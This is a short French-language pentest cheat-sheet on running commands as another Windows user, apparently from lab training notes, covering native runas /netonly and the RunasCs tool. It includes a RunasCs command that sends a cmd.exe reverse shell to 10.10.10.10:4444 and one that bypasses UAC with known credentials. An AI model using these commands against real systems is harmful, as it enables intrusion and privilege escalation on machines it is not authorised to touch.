
## RunAs

Natif
Necessite un shell interactif pour entrer le mot de passe.

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

## RunasCs

https://github.com/antonioCoco/RunasCs

Permet d'utiliser les creds de manière explicite en cas de shell non interactif.

```
RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
```

Permet également de bypasser l'UAC si les creds sont connus.

```
RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
```